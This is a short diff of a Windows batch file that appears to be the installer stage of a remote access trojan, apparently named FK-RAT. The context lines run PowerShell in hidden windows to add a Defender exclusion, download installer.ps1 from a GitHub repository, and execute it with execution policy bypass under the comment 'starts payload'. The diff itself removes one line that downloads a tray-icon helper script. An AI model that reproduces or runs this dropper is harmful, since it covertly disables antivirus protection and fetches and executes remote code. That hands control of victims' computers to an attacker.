@@ -36,7 +36,6 @@ powershell powershell.exe -windowstyle hidden -c "Add-MpPreference -ExclusionPat
 
 REM rat resources
 powershell powershell.exe -windowstyle hidden -c "Invoke-WebRequest -URI https://raw.githubusercontent.com/Sunnickel/FK-RAT/main/files/installer.ps1 -OutFile installer.ps1";
-powershell powershell.exe -windowstyle hidden -c "Invoke-WebRequest -URI https://raw.githubusercontent.com/stevencohn/WindowsPowerShell/fd56aec2c8823c7600cba29e38b9913b109fbf9d/Modules/Scripts/Set-NotifyIcon.ps1 -OutFile notify.ps1";
 
 REM starts payload
 powershell -windowstyle hidden -ep bypass .\installer.ps1 
